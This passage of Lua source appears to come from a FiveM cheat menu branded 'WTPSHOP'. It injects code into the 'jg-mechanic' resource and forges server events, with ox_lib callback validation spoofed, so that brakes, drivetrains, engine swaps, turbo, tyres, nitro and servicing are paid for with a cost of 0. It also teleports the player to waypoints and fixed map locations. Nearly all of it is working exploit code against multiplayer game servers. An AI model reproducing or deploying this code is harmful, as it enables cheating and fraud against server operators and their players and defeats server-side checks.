                                            local veh = b(ped, false)
                                            if veh and veh ~= 0 then
                                                d(veh, 0.0, 0.0, c(veh))
                                            end
                                        end

                                        vXmYLT9pq2()
                                    ]])
                                end
                            end
                        },
                    }
                },
                {
                    label = "Addon's",
                    tabs = {
                        { type = "subMenu", label = "Tuning",
                            subTabs = {
                                {
                                    type = "button",
                                    label = "Ceramic Brakes",
                                    desc = "This will add Ceramic Brakes to you're vehicle.",
                                    onSelect = function()
                                        if GetResourceState("jg-mechanic") == "started" then
                                            executeCode('jg-mechanic', [[
                                                local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                                                if vehicle and DoesEntityExist(vehicle) then
                                                    local plate = GetVehicleNumberPlateText(vehicle)
                                                    local netId = NetworkGetNetworkIdFromEntity(vehicle)
                                                    
                                                    local currentState = Entity(vehicle).state.tuningConfig or {}
                                                    currentState["brakes"] = 1

                                                    local statebagEventId = "jg-mechanic:server:set-vehicle-statebag:" .. math.random(10000, 99999)
                                                    WTPSHOP.Native(TriggerServerEvent, '__ox_cb_jg-mechanic:server:set-vehicle-statebag', "jg-mechanic", statebagEventId, netId, "tuningConfig", currentState) 
                                                    WTPSHOP.Native(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:set-vehicle-statebag", "jg-mechanic", statebagEventId)

                                                    local upgrades = {
                                                        {type = "brakes", option = 1},
                                                    }

                                                    for _, upgrade in ipairs(upgrades) do
                                                        local saveEventId = "jg-mechanic:server:pay-for-tune:" .. math.random(10000, 99999)
                                                        WTPSHOP.Native(TriggerServerEvent, '__ox_cb_jg-mechanic:server:pay-for-tune', "jg-mechanic", saveEventId, upgrade.type, upgrade.option, 0, plate)
                                                        WTPSHOP.Native(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:pay-for-tune", "jg-mechanic", saveEventId)
                                                    end
                                                end
                                            ]])
                                        else
                                            self:Notify("info", "WTPSHOP", "No found script.", 3000)
                                        end
                                    end
                                },
                                {
                                    type = "button",
                                    label = "Drift Tuning",
                                    desc = "This will add Drift Tuning to you're vehicle.",
                                    onSelect = function()
                                        if GetResourceState("jg-mechanic") == "started" then
                                            executeCode('jg-mechanic', [[
                                                local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                                                if vehicle and DoesEntityExist(vehicle) then
                                                    local plate = GetVehicleNumberPlateText(vehicle)
                                                    local netId = NetworkGetNetworkIdFromEntity(vehicle)
                                                    
                                                    local currentState = Entity(vehicle).state.tuningConfig or {}
                                                    currentState["driftTuning"] = 1

                                                    local statebagEventId = "jg-mechanic:server:set-vehicle-statebag:" .. math.random(10000, 99999)
                                                    WTPSHOP.Native(TriggerServerEvent, '__ox_cb_jg-mechanic:server:set-vehicle-statebag', "jg-mechanic", statebagEventId, netId, "tuningConfig", currentState) 
                                                    WTPSHOP.Native(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:set-vehicle-statebag", "jg-mechanic", statebagEventId)

                                                    local upgrades = {
                                                        {type = "driftTuning", option = 1}
                                                    }

                                                    for _, upgrade in ipairs(upgrades) do
                                                        local saveEventId = "jg-mechanic:server:pay-for-tune:" .. math.random(10000, 99999)
                                                        WTPSHOP.Native(TriggerServerEvent, '__ox_cb_jg-mechanic:server:pay-for-tune', "jg-mechanic", saveEventId, upgrade.type, upgrade.option, 0, plate)
                                                        WTPSHOP.Native(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:pay-for-tune", "jg-mechanic", saveEventId)
                                                    end
                                                end
                                            ]])
                                        else
                                            self:Notify("info", "WTPSHOP", "No found script.", 3000)
                                        end
                                    end
                                },
                                { icon = "", type = "scrollable", value = 1, values = { "AWD", "RWD", "FWD" }, label = "Drivetrains", desc = "This will add Drivetrains to you're vehicle.",
                                    onSelect = function(value)
                                        if value == "AWD" then
                                            if GetResourceState("jg-mechanic") == "started" then
                                                executeCode('jg-mechanic', [[
                                                    local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                                                    if vehicle and DoesEntityExist(vehicle) then
                                                        local plate = GetVehicleNumberPlateText(vehicle)
                                                        local netId = NetworkGetNetworkIdFromEntity(vehicle)
                                                        
                                                        local currentState = Entity(vehicle).state.tuningConfig or {}
                                                        currentState["drivetrains"] = 1

                                                        local statebagEventId = "jg-mechanic:server:set-vehicle-statebag:" .. math.random(10000, 99999)
                                                        WTPSHOP.Native(TriggerServerEvent, '__ox_cb_jg-mechanic:server:set-vehicle-statebag', "jg-mechanic", statebagEventId, netId, "tuningConfig", currentState) 
                                                        WTPSHOP.Native(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:set-vehicle-statebag", "jg-mechanic", statebagEventId)

                                                        local upgrades = {
                                                            {type = "drivetrains", option = 1}
                                                        }

                                                        for _, upgrade in ipairs(upgrades) do
                                                            local saveEventId = "jg-mechanic:server:pay-for-tune:" .. math.random(10000, 99999)
                                                            WTPSHOP.Native(TriggerServerEvent, '__ox_cb_jg-mechanic:server:pay-for-tune', "jg-mechanic", saveEventId, upgrade.type, upgrade.option, 0, plate)
                                                            WTPSHOP.Native(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:pay-for-tune", "jg-mechanic", saveEventId)
                                                        end
                                                    end
                                                ]])
                                            else
                                                self:Notify("info", "WTPSHOP", "No found script.", 3000)
                                            end
                                        elseif value == "RWD" then
                                            if GetResourceState("jg-mechanic") == "started" then
                                                executeCode('jg-mechanic', [[
                                                    local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                                                    if vehicle and DoesEntityExist(vehicle) then
                                                        local plate = GetVehicleNumberPlateText(vehicle)
                                                        local netId = NetworkGetNetworkIdFromEntity(vehicle)
                                                        
                                                        local currentState = Entity(vehicle).state.tuningConfig or {}
                                                        currentState["drivetrains"] = 2

                                                        local statebagEventId = "jg-mechanic:server:set-vehicle-statebag:" .. math.random(10000, 99999)
                                                        WTPSHOP.Native(TriggerServerEvent, '__ox_cb_jg-mechanic:server:set-vehicle-statebag', "jg-mechanic", statebagEventId, netId, "tuningConfig", currentState) 
                                                        WTPSHOP.Native(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:set-vehicle-statebag", "jg-mechanic", statebagEventId)

                                                        local upgrades = {
                                                            {type = "drivetrains", option = 2}
                                                        }

                                                        for _, upgrade in ipairs(upgrades) do
                                                            local saveEventId = "jg-mechanic:server:pay-for-tune:" .. math.random(10000, 99999)
                                                            WTPSHOP.Native(TriggerServerEvent, '__ox_cb_jg-mechanic:server:pay-for-tune', "jg-mechanic", saveEventId, upgrade.type, upgrade.option, 0, plate)
                                                            WTPSHOP.Native(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:pay-for-tune", "jg-mechanic", saveEventId)
                                                        end
                                                    end
                                                ]])
                                            else
                                                self:Notify("info", "WTPSHOP", "No found script.", 3000)
                                            end
                                        elseif value == "FWD" then
                                            if GetResourceState("jg-mechanic") == "started" then
                                                executeCode('jg-mechanic', [[
                                                    local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                                                    if vehicle and DoesEntityExist(vehicle) then
                                                        local plate = GetVehicleNumberPlateText(vehicle)
                                                        local netId = NetworkGetNetworkIdFromEntity(vehicle)
                                                        
                                                        local currentState = Entity(vehicle).state.tuningConfig or {}
                                                        currentState["drivetrains"] = 3

                                                        local statebagEventId = "jg-mechanic:server:set-vehicle-statebag:" .. math.random(10000, 99999)
                                                        WTPSHOP.Native(TriggerServerEvent, '__ox_cb_jg-mechanic:server:set-vehicle-statebag', "jg-mechanic", statebagEventId, netId, "tuningConfig", currentState) 
                                                        WTPSHOP.Native(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:set-vehicle-statebag", "jg-mechanic", statebagEventId)

                                                        local upgrades = {
                                                            {type = "drivetrains", option = 3}
                                                        }

                                                        for _, upgrade in ipairs(upgrades) do
                                                            local saveEventId = "jg-mechanic:server:pay-for-tune:" .. math.random(10000, 99999)
                                                            WTPSHOP.Native(TriggerServerEvent, '__ox_cb_jg-mechanic:server:pay-for-tune', "jg-mechanic", saveEventId, upgrade.type, upgrade.option, 0, plate)
                                                            WTPSHOP.Native(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:pay-for-tune", "jg-mechanic", saveEventId)
                                                        end
                                                    end
                                                ]])
                                            else
                                                self:Notify("info", "WTPSHOP", "No found script.", 3000)
                                            end
                                        end
                                    end
                                },
                                { icon = "", type = "scrollable", value = 1, values = { "I4 Turbo 2.5L", "V6 3.3L", "V8 6.5L", "V12 6.0L" }, label = "Engine Swaps", desc = "This will add Engine Swaps to you're vehicle.",
                                    onSelect = function(value)
                                        if value == "I4 Turbo 2.5L" then
                                            if GetResourceState("jg-mechanic") == "started" then
                                                executeCode('jg-mechanic', [[
                                                    local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                                                    if vehicle and DoesEntityExist(vehicle) then
                                                        local plate = GetVehicleNumberPlateText(vehicle)
                                                        local netId = NetworkGetNetworkIdFromEntity(vehicle)
                                                        
                                                        local currentState = Entity(vehicle).state.tuningConfig or {}
                                                        currentState["engineSwaps"] = 1

                                                        local statebagEventId = "jg-mechanic:server:set-vehicle-statebag:" .. math.random(10000, 99999)
                                                        WTPSHOP.Native(TriggerServerEvent, '__ox_cb_jg-mechanic:server:set-vehicle-statebag', "jg-mechanic", statebagEventId, netId, "tuningConfig", currentState) 
                                                        WTPSHOP.Native(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:set-vehicle-statebag", "jg-mechanic", statebagEventId)

                                                        local upgrades = {
                                                            {type = "engineSwaps", option = 1}
                                                        }

                                                        for _, upgrade in ipairs(upgrades) do
                                                            local saveEventId = "jg-mechanic:server:pay-for-tune:" .. math.random(10000, 99999)
                                                            WTPSHOP.Native(TriggerServerEvent, '__ox_cb_jg-mechanic:server:pay-for-tune', "jg-mechanic", saveEventId, upgrade.type, upgrade.option, 0, plate)
                                                            WTPSHOP.Native(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:pay-for-tune", "jg-mechanic", saveEventId)
                                                        end
                                                    end
                                                ]])
                                            else
                                                self:Notify("info", "WTPSHOP", "No found script.", 3000)
                                            end
                                        elseif value == "V6 3.3L" then
                                            if GetResourceState("jg-mechanic") == "started" then
                                                executeCode('jg-mechanic', [[
                                                    local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                                                    if vehicle and DoesEntityExist(vehicle) then
                                                        local plate = GetVehicleNumberPlateText(vehicle)
                                                        local netId = NetworkGetNetworkIdFromEntity(vehicle)
                                                        
                                                        local currentState = Entity(vehicle).state.tuningConfig or {}
                                                        currentState["engineSwaps"] = 2

                                                        local statebagEventId = "jg-mechanic:server:set-vehicle-statebag:" .. math.random(10000, 99999)
                                                        WTPSHOP.Native(TriggerServerEvent, '__ox_cb_jg-mechanic:server:set-vehicle-statebag', "jg-mechanic", statebagEventId, netId, "tuningConfig", currentState) 
                                                        WTPSHOP.Native(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:set-vehicle-statebag", "jg-mechanic", statebagEventId)

                                                        local upgrades = {
                                                            {type = "engineSwaps", option = 2}
                                                        }

                                                        for _, upgrade in ipairs(upgrades) do
                                                            local saveEventId = "jg-mechanic:server:pay-for-tune:" .. math.random(10000, 99999)
                                                            WTPSHOP.Native(TriggerServerEvent, '__ox_cb_jg-mechanic:server:pay-for-tune', "jg-mechanic", saveEventId, upgrade.type, upgrade.option, 0, plate)
                                                            WTPSHOP.Native(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:pay-for-tune", "jg-mechanic", saveEventId)
                                                        end
                                                    end
                                                ]])
                                            else
                                                self:Notify("info", "WTPSHOP", "No found script.", 3000)
                                            end
                                        elseif value == "V8 6.5L" then
                                            if GetResourceState("jg-mechanic") == "started" then
                                                executeCode('jg-mechanic', [[
                                                    local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                                                    if vehicle and DoesEntityExist(vehicle) then
                                                        local plate = GetVehicleNumberPlateText(vehicle)
                                                        local netId = NetworkGetNetworkIdFromEntity(vehicle)
                                                        
                                                        local currentState = Entity(vehicle).state.tuningConfig or {}
                                                        currentState["engineSwaps"] = 3

                                                        local statebagEventId = "jg-mechanic:server:set-vehicle-statebag:" .. math.random(10000, 99999)
                                                        WTPSHOP.Native(TriggerServerEvent, '__ox_cb_jg-mechanic:server:set-vehicle-statebag', "jg-mechanic", statebagEventId, netId, "tuningConfig", currentState) 
                                                        WTPSHOP.Native(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:set-vehicle-statebag", "jg-mechanic", statebagEventId)

                                                        local upgrades = {
                                                            {type = "engineSwaps", option = 3}
                                                        }

                                                        for _, upgrade in ipairs(upgrades) do
                                                            local saveEventId = "jg-mechanic:server:pay-for-tune:" .. math.random(10000, 99999)
                                                            WTPSHOP.Native(TriggerServerEvent, '__ox_cb_jg-mechanic:server:pay-for-tune', "jg-mechanic", saveEventId, upgrade.type, upgrade.option, 0, plate)
                                                            WTPSHOP.Native(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:pay-for-tune", "jg-mechanic", saveEventId)
                                                        end
                                                    end
                                                ]])
                                            else
                                                self:Notify("info", "WTPSHOP", "No found script.", 3000)
                                            end
                                        elseif value == "V12 6.0L" then
                                            if GetResourceState("jg-mechanic") == "started" then
                                                executeCode('jg-mechanic', [[
                                                    local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                                                    if vehicle and DoesEntityExist(vehicle) then
                                                        local plate = GetVehicleNumberPlateText(vehicle)
                                                        local netId = NetworkGetNetworkIdFromEntity(vehicle)
                                                        
                                                        local currentState = Entity(vehicle).state.tuningConfig or {}
                                                        currentState["engineSwaps"] = 4

                                                        local statebagEventId = "jg-mechanic:server:set-vehicle-statebag:" .. math.random(10000, 99999)
                                                        WTPSHOP.Native(TriggerServerEvent, '__ox_cb_jg-mechanic:server:set-vehicle-statebag', "jg-mechanic", statebagEventId, netId, "tuningConfig", currentState) 
                                                        WTPSHOP.Native(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:set-vehicle-statebag", "jg-mechanic", statebagEventId)

                                                        local upgrades = {
                                                            {type = "engineSwaps", option = 4}
                                                        }

                                                        for _, upgrade in ipairs(upgrades) do
                                                            local saveEventId = "jg-mechanic:server:pay-for-tune:" .. math.random(10000, 99999)
                                                            WTPSHOP.Native(TriggerServerEvent, '__ox_cb_jg-mechanic:server:pay-for-tune', "jg-mechanic", saveEventId, upgrade.type, upgrade.option, 0, plate)
                                                            WTPSHOP.Native(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:pay-for-tune", "jg-mechanic", saveEventId)
                                                        end
                                                    end
                                                ]])
                                            else
                                                self:Notify("info", "WTPSHOP", "No found script.", 3000)
                                            end
                                        end
                                    end
                                },
                                {
                                    type = "button",
                                    label = "Turbocharging",
                                    desc = "This will add Turbocharging to you're vehicle.",
                                    onSelect = function()
                                        if GetResourceState("jg-mechanic") == "started" then
                                            executeCode('jg-mechanic', [[
                                                local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                                                if vehicle and DoesEntityExist(vehicle) then
                                                    local plate = GetVehicleNumberPlateText(vehicle)
                                                    local netId = NetworkGetNetworkIdFromEntity(vehicle)
                                                    
                                                    local currentState = Entity(vehicle).state.tuningConfig or {}
                                                    currentState["turbocharging"] = true

                                                    local statebagEventId = "jg-mechanic:server:set-vehicle-statebag:" .. math.random(10000, 99999)
                                                    WTPSHOP.Native(TriggerServerEvent, '__ox_cb_jg-mechanic:server:set-vehicle-statebag', "jg-mechanic", statebagEventId, netId, "tuningConfig", currentState) 
                                                    WTPSHOP.Native(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:set-vehicle-statebag", "jg-mechanic", statebagEventId)

                                                    local upgrades = {
                                                        {type = "turbocharging", option = 1},
                                                    }

                                                    for _, upgrade in ipairs(upgrades) do
                                                        local saveEventId = "jg-mechanic:server:pay-for-tune:" .. math.random(10000, 99999)
                                                        WTPSHOP.Native(TriggerServerEvent, '__ox_cb_jg-mechanic:server:pay-for-tune', "jg-mechanic", saveEventId, upgrade.type, upgrade.option, 0, plate)
                                                        WTPSHOP.Native(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:pay-for-tune", "jg-mechanic", saveEventId)
                                                    end
                                                end
                                            ]])
                                        else
                                            self:Notify("info", "WTPSHOP", "No found script.", 3000)
                                        end
                                    end
                                },
                                { icon = "", type = "scrollable", value = 1, values = { "Slicks", "Semi-slicks", "Offroad" }, label = "Tyres", desc = "This will add tyres to you're vehicle.",
                                    onSelect = function(value)
                                        if value == "Slicks" then
                                            if GetResourceState("jg-mechanic") == "started" then
                                                executeCode('jg-mechanic', [[
                                                    local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                                                    if vehicle and DoesEntityExist(vehicle) then
                                                        local plate = GetVehicleNumberPlateText(vehicle)
                                                        local netId = NetworkGetNetworkIdFromEntity(vehicle)
                                                        
                                                        local currentState = Entity(vehicle).state.tuningConfig or {}
                                                        currentState["tyres"] = 1

                                                        local statebagEventId = "jg-mechanic:server:set-vehicle-statebag:" .. math.random(10000, 99999)
                                                        WTPSHOP.Native(TriggerServerEvent, '__ox_cb_jg-mechanic:server:set-vehicle-statebag', "jg-mechanic", statebagEventId, netId, "tuningConfig", currentState) 
                                                        WTPSHOP.Native(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:set-vehicle-statebag", "jg-mechanic", statebagEventId)

                                                        local upgrades = {
                                                            {type = "tyres", option = 1}
                                                        }

                                                        for _, upgrade in ipairs(upgrades) do
                                                            local saveEventId = "jg-mechanic:server:pay-for-tune:" .. math.random(10000, 99999)
                                                            WTPSHOP.Native(TriggerServerEvent, '__ox_cb_jg-mechanic:server:pay-for-tune', "jg-mechanic", saveEventId, upgrade.type, upgrade.option, 0, plate)
                                                            WTPSHOP.Native(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:pay-for-tune", "jg-mechanic", saveEventId)
                                                        end
                                                    end
                                                ]])
                                            else
                                                self:Notify("info", "WTPSHOP", "No found script.", 3000)
                                            end
                                        elseif value == "Semi-slicks" then
                                            if GetResourceState("jg-mechanic") == "started" then
                                                executeCode('jg-mechanic', [[
                                                    local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                                                    if vehicle and DoesEntityExist(vehicle) then
                                                        local plate = GetVehicleNumberPlateText(vehicle)
                                                        local netId = NetworkGetNetworkIdFromEntity(vehicle)
                                                        
                                                        local currentState = Entity(vehicle).state.tuningConfig or {}
                                                        currentState["tyres"] = 2

                                                        local statebagEventId = "jg-mechanic:server:set-vehicle-statebag:" .. math.random(10000, 99999)
                                                        WTPSHOP.Native(TriggerServerEvent, '__ox_cb_jg-mechanic:server:set-vehicle-statebag', "jg-mechanic", statebagEventId, netId, "tuningConfig", currentState) 
                                                        WTPSHOP.Native(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:set-vehicle-statebag", "jg-mechanic", statebagEventId)

                                                        local upgrades = {
                                                            {type = "tyres", option = 2}
                                                        }

                                                        for _, upgrade in ipairs(upgrades) do
                                                            local saveEventId = "jg-mechanic:server:pay-for-tune:" .. math.random(10000, 99999)
                                                            WTPSHOP.Native(TriggerServerEvent, '__ox_cb_jg-mechanic:server:pay-for-tune', "jg-mechanic", saveEventId, upgrade.type, upgrade.option, 0, plate)
                                                            WTPSHOP.Native(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:pay-for-tune", "jg-mechanic", saveEventId)
                                                        end
                                                    end
                                                ]])
                                            else
                                                self:Notify("info", "WTPSHOP", "No found script.", 3000)
                                            end
                                        elseif value == "Offroad" then
                                            if GetResourceState("jg-mechanic") == "started" then
                                                executeCode('jg-mechanic', [[
                                                    local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                                                    if vehicle and DoesEntityExist(vehicle) then
                                                        local plate = GetVehicleNumberPlateText(vehicle)
                                                        local netId = NetworkGetNetworkIdFromEntity(vehicle)
                                                        
                                                        local currentState = Entity(vehicle).state.tuningConfig or {}
                                                        currentState["tyres"] = 3

                                                        local statebagEventId = "jg-mechanic:server:set-vehicle-statebag:" .. math.random(10000, 99999)
                                                        WTPSHOP.Native(TriggerServerEvent, '__ox_cb_jg-mechanic:server:set-vehicle-statebag', "jg-mechanic", statebagEventId, netId, "tuningConfig", currentState) 
                                                        WTPSHOP.Native(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:set-vehicle-statebag", "jg-mechanic", statebagEventId)

                                                        local upgrades = {
                                                            {type = "tyres", option = 3}
                                                        }

                                                        for _, upgrade in ipairs(upgrades) do
                                                            local saveEventId = "jg-mechanic:server:pay-for-tune:" .. math.random(10000, 99999)
                                                            WTPSHOP.Native(TriggerServerEvent, '__ox_cb_jg-mechanic:server:pay-for-tune', "jg-mechanic", saveEventId, upgrade.type, upgrade.option, 0, plate)
                                                            WTPSHOP.Native(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:pay-for-tune", "jg-mechanic", saveEventId)
                                                        end
                                                    end
                                                ]])
                                            else
                                                self:Notify("info", "WTPSHOP", "No found script.", 3000)
                                            end
                                        end
                                    end
                                },
                            }
                        },
                        {
                            type = "button",
                            label = "Pms",
                            desc = "This will repair all PMS to you're vehicle.",
                            onSelect = function()
                                if GetResourceState("jg-mechanic") == "started" then
                                    executeCode('jg-mechanic', [[
                                        local currentVehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                                        if currentVehicle and currentVehicle ~= 0 then
                                            local plate = GetVehicleNumberPlateText(currentVehicle)
                                            if plate then
                                                plate = string.gsub(plate, "^%s*(.-)%s*$", "%1")
                                            end

                                            local perfectServicingData = {
                                                suspension = 100, tyres = 100, brakePads = 100, engineOil = 100,
                                                clutch = 100, airFilter = 100, sparkPlugs = 100, evMotor = 100,
                                                evBattery = 100, evCoolant = 100
                                            }

                                            local networkId = NetworkGetNetworkIdFromEntity(currentVehicle)
                                            local stateBagName = string.format("entity:%s", networkId)

                                            WTPSHOP.Native(TriggerServerEvent, '__ox_cb_jg-mechanic:server:set-vehicle-statebag', "jg-mechanic", "jg-mechanic:server:set-vehicle-statebag:34179", networkId, "servicingData", perfectServicingData) 
                                            WTPSHOP.Native(TriggerServerEvent, 'jg-vehiclemileage:server:updateVehicleMileage', plate, 1)
                                        end
                                    ]])
                                else
                                    self:Notify("info", "WTPSHOP", "No found script.", 3000)
                                end
                            end
                        },
                        {
                            type = "button",
                            label = "V12",
                            desc = "This will add V12 to you're vehicle.",
                            onSelect = function()
                                if GetResourceState("jg-mechanic") == "started" then
                                    executeCode('jg-mechanic', [[
                                        local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                                        if vehicle and DoesEntityExist(vehicle) then
                                            local plate = GetVehicleNumberPlateText(vehicle)
                                            local netId = NetworkGetNetworkIdFromEntity(vehicle)
                                            
                                            local currentState = Entity(vehicle).state.tuningConfig or {}
                                            currentState["engineSwaps"] = 4
                                            currentState["brakes"] = 1
                                            currentState["drivetrains"] = 1
                                            currentState["tyres"] = 1
                                            currentState["turbocharging"] = true

                                            local statebagEventId = "jg-mechanic:server:set-vehicle-statebag:" .. math.random(10000, 99999)
                                            WTPSHOP.Native(TriggerServerEvent, '__ox_cb_jg-mechanic:server:set-vehicle-statebag', "jg-mechanic", statebagEventId, netId, "tuningConfig", currentState) 
                                            WTPSHOP.Native(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:set-vehicle-statebag", "jg-mechanic", statebagEventId)

                                            local upgrades = {
                                                {type = "engineSwaps", option = 4},
                                                {type = "brakes", option = 1},
                                                {type = "drivetrains", option = 1},
                                                {type = "tyres", option = 1},
                                                {type = "turbocharging", option = 1}
                                            }

                                            for _, upgrade in ipairs(upgrades) do
                                                local saveEventId = "jg-mechanic:server:pay-for-tune:" .. math.random(10000, 99999)
                                                WTPSHOP.Native(TriggerServerEvent, '__ox_cb_jg-mechanic:server:pay-for-tune', "jg-mechanic", saveEventId, upgrade.type, upgrade.option, 0, plate)
                                                WTPSHOP.Native(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:pay-for-tune", "jg-mechanic", saveEventId)
                                            end
                                        end
                                    ]])
                                else
                                    self:Notify("info", "WTPSHOP", "No found script.", 3000)
                                end
                            end
                        },
                        { type = "slider", label = "Nitro", desc = "This will add nitro to you're vehicle.", scrollType = "onEnter", value = 1, min = 0, max = 3, step = 1.0,
                            onSelect = function(value)
                                if GetResourceState("jg-mechanic") == "started" then
                                    executeCode('jg-mechanic', string.format([[
                                        local ped = PlayerPedId()
                                        local vehicle = GetVehiclePedIsIn(ped, false)
                                        local nitroAmount = %s

                                        if vehicle and vehicle ~= 0 then
                                            WTPSHOP.Native(TriggerServerEvent, '__ox_cb_jg-mechanic:server:install-new-bottle', "jg-mechanic", "jg-mechanic:server:install-new-bottle:11050") 
                                            WTPSHOP.Native(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:install-new-bottle", "jg-mechanic", "jg-mechanic:server:install-new-bottle:11050")
                                            
                                            local nitrousProps = {
                                                nitrousInstalledBottles = nitroAmount,
                                                nitrousFilledBottles = nitroAmount,
                                                nitrousCapacity = 10.0
                                            }
                                            
                                            exports['jg-mechanic']:setVehicleProperties(vehicle, nitrousProps, true)
                                        end
                                    ]], value))
                                else
                                    self:Notify("info", "WTPSHOP", "No found script.", 3000)
                                end
                            end
                        },
                    }
                },
            }
        },
        {
            icon = 'ph-map-pin',
            label = "Teleport Options",
            type = "subMenu",
            categories = {
                {
                    label = "Teleport",
                    tabs = {
                        {
                            type = "button",
                            label = "Teleport to Waypoint",
                            icon = "",
                            onSelect = function()
                                ApiRasclat.Monitor([[
                                    local function getSafeGroundZ(x, y, fallbackZ)
                                        local foundGround, groundZ = false, fallbackZ

                                        for height = 0.0, 1000.0, 25.0 do
                                            foundGround, groundZ = GetGroundZFor_3dCoord(x, y, height, false)
                                            if foundGround then
                                                return groundZ + 1.0
                                            end
                                        end

                                        return fallbackZ + 1.0
                                    end

                                    local blip = GetFirstBlipInfoId(8)
                                    if not DoesBlipExist(blip) then
                                        return
                                    end

                                    local coords = GetBlipInfoIdCoord(blip)
                                    local ped = PlayerPedId()
                                    if not DoesEntityExist(ped) then
                                        return
                                    end

                                    local safeZ = getSafeGroundZ(coords.x, coords.y, coords.z)

                                    local entityToCheck = ped
                                    if IsPedInAnyVehicle(ped, false) then
                                        entityToCheck = GetVehiclePedIsIn(ped, false)
                                    end

                                    WTPSHOP.Native(RequestCollisionAtCoord, coords.x, coords.y, safeZ)
                                    WTPSHOP.Native(FreezeEntityPosition, entityToCheck, true)
                                    WTPSHOP.Native(SetPedCoordsKeepVehicle, ped, coords.x, coords.y, safeZ)

                                    local startTime = GetGameTimer()
                                    while (GetGameTimer() - startTime) < 5000 do
                                        WTPSHOP.Native(RequestCollisionAtCoord, coords.x, coords.y, safeZ)

                                        if HasCollisionLoadedAroundEntity(entityToCheck) then
                                            break
                                        end

                                        WTPSHOP.Native(Wait, 50)
                                    end

                                    WTPSHOP.Native(FreezeEntityPosition, entityToCheck, false)
                                ]])
                            end
                        },
                        {
                            type = "button",
                            label = "Teleport to Grove",
                            icon = "",
                            onSelect = function()
                                ApiRasclat.Monitor([[
                                    local targetX, targetY, targetZ = 100.0, -1940.0, 20.3

                                    local function getSafeGroundZ(x, y, fallbackZ)
                                        local foundGround, groundZ = false, fallbackZ

                                        for height = 0.0, 1000.0, 25.0 do
                                            foundGround, groundZ = GetGroundZFor_3dCoord(x, y, height, false)
                                            if foundGround then
                                                return groundZ + 1.0
                                            end
                                        end

                                        return fallbackZ + 1.0
                                    end

                                    local ped = PlayerPedId()
                                    if not DoesEntityExist(ped) then
                                        return
                                    end

                                    local entityToTeleport = ped
                                    if IsPedInAnyVehicle(ped, false) then
                                        entityToTeleport = GetVehiclePedIsIn(ped, false)
                                    end

                                    local safeZ = getSafeGroundZ(targetX, targetY, targetZ)
                                    WTPSHOP.Native(RequestCollisionAtCoord, targetX, targetY, safeZ)
                                    WTPSHOP.Native(FreezeEntityPosition, entityToTeleport, true)
                                    WTPSHOP.Native(SetEntityCoords, entityToTeleport, targetX, targetY, safeZ, false, false, false, true)
                                    
                                    local startTime = GetGameTimer()
                                    while (GetGameTimer() - startTime) < 5000 do
                                        WTPSHOP.Native(RequestCollisionAtCoord, targetX, targetY, safeZ)
                                        if HasCollisionLoadedAroundEntity(entityToTeleport) then
                                            break
                                        end

                                        WTPSHOP.Native(Wait, 50)
                                    end

                                    WTPSHOP.Native(FreezeEntityPosition, entityToTeleport, false)
                                ]])
                            end
                        },
                        {
                            type = "button",
                            label = "Teleport to Legion Square",
                            icon = "",
                            onSelect = function()
                                ApiRasclat.Monitor([[
                                    local targetX, targetY, targetZ = 224.17, -869.13, 30.49

                                    local function getSafeGroundZ(x, y, fallbackZ)
                                        local foundGround, groundZ = false, fallbackZ
                                        for height = 0.0, 1000.0, 25.0 do
                                            foundGround, groundZ = GetGroundZFor_3dCoord(x, y, height, false)
                                            if foundGround then
                                                return groundZ + 1.0
                                            end
                                        end
                                        return fallbackZ + 1.0
                                    end

                                    local ped = PlayerPedId()
                                    if not DoesEntityExist(ped) then return end

                                    local entityToTeleport = ped
                                    if IsPedInAnyVehicle(ped, false) then
                                        entityToTeleport = GetVehiclePedIsIn(ped, false)
                                    end

                                    local safeZ = getSafeGroundZ(targetX, targetY, targetZ)

                                    WTPSHOP.Native(RequestCollisionAtCoord, targetX, targetY, safeZ)
